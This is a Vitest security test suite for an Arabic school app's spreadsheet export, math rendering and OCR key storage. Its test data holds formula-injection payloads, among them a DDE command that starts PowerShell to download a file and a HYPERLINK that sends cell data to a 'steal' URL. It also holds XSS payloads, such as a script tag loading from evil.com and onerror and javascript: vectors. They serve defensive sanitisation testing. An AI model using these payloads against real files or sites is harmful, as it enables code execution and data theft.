// @vitest-environment jsdom
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import React, { act } from 'react';
import { createRoot, Root } from 'react-dom/client';
import { ExcelService } from '../src/services/excelService.js';
import { renderKatexToString, renderChemistryToString, sanitizeHtml } from '../src/lib/math/katexRenderer.js';
import { HandwritingOcrModal } from '../src/components/questions/HandwritingOcrModal.js';
import { ToastProvider } from '../src/components/common/Toast.js';

(globalThis as any).IS_REACT_ACT_ENVIRONMENT = true;

describe('Adversarial Challenger M2 Suite: Injection & Privacy Hardening', () => {
  let container: HTMLDivElement;
  let root: Root;

  beforeEach(() => {
    localStorage.clear();
    sessionStorage.clear();
    container = document.createElement('div');
    document.body.appendChild(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => {
      root.unmount();
    });
    container.remove();
    localStorage.clear();
    sessionStorage.clear();
  });

  // =========================================================================
  // TASK 1: CSV / Excel Formula Injection Adversarial Test
  // =========================================================================
  describe('1. Adversarial CSV / Excel Formula Injection Test', () => {
    const requiredPayloads = [
      { payload: '=1+1', expected: "'=1+1" },
      { payload: '@SUM(A1:B1)', expected: "'@SUM(A1:B1)" },
      { payload: '-5+2', expected: "'-5+2" },
      { payload: '+100', expected: "'+100" },
      { payload: "=cmd|' /C calc'!A0", expected: "'=cmd|' /C calc'!A0" },
    ];

    it.each(requiredPayloads)(
      'escapes required dispatch payload "$payload" with leading single quote (\')',
      ({ payload, expected }) => {
        const result = ExcelService.escapeCsvCell(payload);
        // If wrapped in double quotes due to comma/newline/quotes:
        const unquoted = result.startsWith('"') && result.endsWith('"')
          ? result.slice(1, -1).replace(/""/g, '"')
          : result;

        expect(unquoted).toBe(expected);
        expect(unquoted.startsWith("'")).toBe(true);
        // Ensure formula trigger characters are NEVER unescaped at index 0
        expect(result.startsWith('=')).toBe(false);
        expect(result.startsWith('@')).toBe(false);
        expect(result.startsWith('+')).toBe(false);
        expect(result.startsWith('-')).toBe(false);
      }
    );

    it('adversarially stress-tests extended formula injection vectors', () => {
      const advancedPayloads = [
        '=cmd|\'/C powershell.exe -w hidden -c (new-object System.Net.WebClient).DownloadFile(...) \'!A0',
        '=HYPERLINK("http://malicious-tracker.com/steal?data=" & A1, "اضغط هنا")',
        '-2+3*4',
        '+9647701234567',
        '@SUM(1, 2, 3)',
        '=@SUM(1,2)',
        '++100',
        '--50',
      ];

      for (const payload of advancedPayloads) {
        const escaped = ExcelService.escapeCsvCell(payload);
        const unquoted = escaped.startsWith('"') && escaped.endsWith('"')
          ? escaped.slice(1, -1).replace(/""/g, '"')
          : escaped;
        expect(unquoted.startsWith("'")).toBe(true);
      }
    });

    it('correctly preserves safe inputs without unnecessary corruption', () => {
      expect(ExcelService.escapeCsvCell('أحمد علي حسن')).toBe('أحمد علي حسن');
      expect(ExcelService.escapeCsvCell('100')).toBe('100');
      expect(ExcelService.escapeCsvCell(50)).toBe('50');
      expect(ExcelService.escapeCsvCell('')).toBe('');
      expect(ExcelService.escapeCsvCell(null)).toBe('');
      expect(ExcelService.escapeCsvCell(undefined)).toBe('');
    });

    it('escapes formulas in exportStudentsToCsv across all customizable fields', () => {
      const maliciousRoster = [
        {
          rollNumber: 1,
          fullName: '=1+1',
          division: '@SUM(A1:B1)',
          gender: 'male',
          guardianPhone: '+100',
        },
        {
          rollNumber: 2,
          fullName: "-5+2",
          division: 'أ',
          gender: 'female',
          guardianPhone: "=cmd|' /C calc'!A0",
        },
      ];

      const csvOutput = ExcelService.exportStudentsToCsv(maliciousRoster);
      expect(csvOutput.startsWith('\uFEFF')).toBe(true); // UTF-8 BOM
      expect(csvOutput).toContain("'=1+1");
      expect(csvOutput).toContain("'@SUM(A1:B1)");
      expect(csvOutput).toContain("'-5+2");
      expect(csvOutput).toContain("'+100");
      expect(csvOutput).toContain("'=cmd|' /C calc'!A0");

      // Verify no raw unescaped formula lines exist
      const lines = csvOutput.split('\r\n');
      for (const line of lines.slice(1)) {
        if (!line.trim()) continue;
        const cells = line.split(',');
        for (const cell of cells) {
          expect(cell.startsWith('=')).toBe(false);
          expect(cell.startsWith('@')).toBe(false);
          expect(cell.startsWith('+')).toBe(false);
          expect(cell.startsWith('-')).toBe(false);
        }
      }
    });

    it('escapes formulas in exportGradebookToExcelXml', () => {
      const columns = [
        { key: 'col1', header: '=1+1' },
        { key: 'col2', header: '@SUM(A1:B1)' },
      ];
      const rows = [
        { col1: '-5+2', col2: '+100' },
        { col1: "=cmd|' /C calc'!A0", col2: 'safe value' },
      ];

      const xmlOutput = ExcelService.exportGradebookToExcelXml(columns, rows);
      expect(xmlOutput).toContain("'=1+1");
      expect(xmlOutput).toContain("'@SUM(A1:B1)");
      expect(xmlOutput).toContain("'-5+2");
      expect(xmlOutput).toContain("'+100");
      expect(xmlOutput).toContain("'=cmd|' /C calc'!A0");
      expect(xmlOutput).not.toContain('<Data ss:Type="String">=');
      expect(xmlOutput).not.toContain('<Data ss:Type="String">@');
    });
  });

  // =========================================================================
  // TASK 2: KaTeX & DOMPurify Sanitization Adversarial Test
  // =========================================================================
  describe('2. Adversarial KaTeX & DOMPurify XSS Sanitization Test', () => {
    it('DOMPurify strips harmful executable tags: script, onerror, onload', () => {
      const maliciousPayloads = [
        '<script>alert("xss")</script>',
        '<script src="https://evil.com/payload.js"></script>',
        '<img src="doesnotexist" onerror="alert(1)">',
        '<svg onload="alert(document.cookie)">',
        '<body onload="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<a href="javascript:alert(1)">انقر هنا</a>',
        '<input type="image" src="x" onerror="alert(1)">',
        '<details open ontoggle="alert(1)">',
        '<math><mtext><script>alert(1)</script></mtext></math>',
      ];

      for (const payload of maliciousPayloads) {
        const sanitized = sanitizeHtml(payload);
        const testDom = document.createElement('div');
        testDom.innerHTML = sanitized;

        // Verify harmful tags are completely eliminated from DOM
        expect(testDom.querySelectorAll('script').length).toBe(0);
        expect(testDom.querySelectorAll('iframe').length).toBe(0);
        expect(testDom.querySelectorAll('[onerror]').length).toBe(0);
        expect(testDom.querySelectorAll('[onload]').length).toBe(0);
        expect(testDom.querySelectorAll('[ontoggle]').length).toBe(0);
        expect(testDom.querySelectorAll('a[href^="javascript:"]').length).toBe(0);
      }
    });

    it('sanitizes malicious LaTeX expressions rendered via renderKatexToString', () => {
      const latexAttacks = [
        '\\text{<script>alert(1)</script>}',
        '\\htmlId{"><script>alert(1)</script>}{x}',
        '\\href{javascript:alert(1)}{ClickMe}',
        '\\url{javascript:alert(1)}',
        'x + \\text{<img src=x onerror=alert(1)>}',
        '\\text{<svg onload=alert(1)>}',
      ];

      for (const attack of latexAttacks) {
        const rendered = renderKatexToString(attack);
        const testDom = document.createElement('div');
        testDom.innerHTML = rendered;

        // Verify no executable script or event handler is inserted into the DOM
        expect(testDom.querySelectorAll('script').length).toBe(0);
        expect(testDom.querySelectorAll('[onerror]').length).toBe(0);
        expect(testDom.querySelectorAll('[onload]').length).toBe(0);
        expect(testDom.querySelectorAll('a[href^="javascript:"]').length).toBe(0);
      }
    });

    it(
      'sanitizes large LaTeX payloads (>5000 chars) ensuring no fast-path bypass',
      () => {
      const basePayload = 'a + b '.repeat(900); // ~5400 chars
      const attacks = [
        basePayload + '<script>alert(1)</script>',
        basePayload + '<img src=x onerror=alert(1)>',
        basePayload + '<svg onload=alert(1)>',
        basePayload + '\\href{javascript:alert(1)}{click}',
      ];

      for (const attack of attacks) {
        const rendered = renderKatexToString(attack);
        const testDom = document.createElement('div');
        testDom.innerHTML = rendered;

        expect(testDom.querySelectorAll('script').length).toBe(0);
        expect(testDom.querySelectorAll('[onerror]').length).toBe(0);
        expect(testDom.querySelectorAll('[onload]').length).toBe(0);
        expect(testDom.querySelectorAll('a[href^="javascript:"]').length).toBe(0);
      }
    }, 25000);

    it('safely renders genuine math formulas preserving MathML and KaTeX markup', () => {
      const genuineMath = 'E = mc^2';
      const output = renderKatexToString(genuineMath);
      expect(output).toContain('katex');
      expect(output).toContain('annotation');
      expect(output).toContain('encoding="application/x-tex"');
      expect(output).toContain('E = mc^2');
    });

    it('safely renders chemistry formulas with renderChemistryToString', () => {
      const chem = '2H2 + O2 -> 2H2O';
      const output = renderChemistryToString(chem);
      expect(output).toContain('katex');
      const testDom = document.createElement('div');
      testDom.innerHTML = output;
      expect(testDom.querySelectorAll('script').length).toBe(0);
    });
  });

  // =========================================================================
  // TASK 3: OCR Modal Privacy & Secret Storage Test
  // =========================================================================
  describe('3. Adversarial OCR Modal Privacy & Storage Verification', () => {
    it('migrates legacy API key from localStorage to sessionStorage and deletes from localStorage on mount', async () => {
      const sampleKey = 'AIzaSy_LEGACY_TEST_SECRET_12345';
      localStorage.setItem('techeeer_gemini_api_key', sampleKey);
      sessionStorage.clear();

      await act(async () => {
        root.render(
          React.createElement(
            ToastProvider,
            null,
            React.createElement(HandwritingOcrModal, {
              isOpen: true,
              onClose: () => {},
              onApplyQuestions: () => {},
            })
          )
        );
      });

      // Verify localStorage is immediately wiped of the secret
      expect(localStorage.getItem('techeeer_gemini_api_key')).toBeNull();
      // Verify key was safely migrated to sessionStorage
      expect(sessionStorage.getItem('techeeer_gemini_api_key')).toBe(sampleKey);
    });

    it('never writes newly entered Gemini API key into localStorage', async () => {
      localStorage.clear();
      sessionStorage.clear();

      await act(async () => {
        root.render(
          React.createElement(
            ToastProvider,
            null,
            React.createElement(HandwritingOcrModal, {
              isOpen: true,
              onClose: () => {},
              onApplyQuestions: () => {},
            })
          )
        );
      });

      // Open settings by clicking button
      const buttons = Array.from(container.querySelectorAll('button'));
      const settingsBtn = buttons.find((b) => b.textContent?.includes('إعدادات Gemini API'));
      expect(settingsBtn).toBeDefined();

      await act(async () => {
        settingsBtn?.click();
      });

      // Find API key input
      const input = container.querySelector('input[placeholder="AIzaSy..."]') as HTMLInputElement;
      expect(input).not.toBeNull();

      const newSecret = 'AIzaSy_NEW_USER_KEY_98765';
      await act(async () => {
        input.value = newSecret;
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
      });

      // Ensure key is NOT in localStorage
      expect(localStorage.getItem('techeeer_gemini_api_key')).toBeNull();
    });

    it('renders the mandatory Arabic privacy disclaimer banner with prominent warning', async () => {
      await act(async () => {
        root.render(
          React.createElement(
            ToastProvider,
            null,
            React.createElement(HandwritingOcrModal, {
              isOpen: true,
              onClose: () => {},
              onApplyQuestions: () => {},
            })
          )
        );
      });

      const text = container.textContent || '';
      // Verify disclaimer title
      expect(text).toContain('تنبيه الخصوصية والأمان لمعالجة أوراق الامتحانات:');

      // Verify privacy text explicitly covers Google cloud, student personal data, local fallback, and session storage
      expect(text).toContain('خوادم Google');
      expect(text).toContain('أسماء وبيانات الطلاب الشخصية');
      expect(text).toContain('محرك الاستخراج المحلي');
      expect(text).toContain('Session Storage');
    });

    it('does not render modal when isOpen is false', async () => {
      await act(async () => {
        root.render(
          React.createElement(
            ToastProvider,
            null,
            React.createElement(HandwritingOcrModal, {
              isOpen: false,
              onClose: () => {},
              onApplyQuestions: () => {},
            })
          )
        );
      });

      expect(container.firstChild).toBeNull();
    });
  });
});
